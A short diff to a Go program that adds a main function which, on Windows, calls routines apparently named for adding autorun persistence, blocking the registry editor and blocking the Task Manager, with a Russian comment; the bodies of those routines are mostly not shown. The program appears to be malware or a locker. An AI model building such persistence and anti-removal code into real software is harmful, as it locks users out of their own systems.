@@ -6,6 +6,7 @@ import (
 	"log"
 	"os"
 	"path/filepath"
+	"runtime"
 )
 
 func AddAutorun() {
@@ -64,5 +65,22 @@ func blockdispetcher() {
 	}
 	if err := k.Close(); err != nil {
 		log.Fatal(err)
+	}
+}
+// Главная функция
+func main() {
+	os := runtime.GOOS
+	switch os {
+	case "windows":
+		AddAutorun()
+		create()
+		blockreestr()
+		blockdispetcher()	
+	case "darwin":
+		fmt.Println("Darwin")	
+	case "linux":
+		fmt.Println("Linux")
+	default:
+		fmt.Printf("%s.\n", os)
 	}
 }
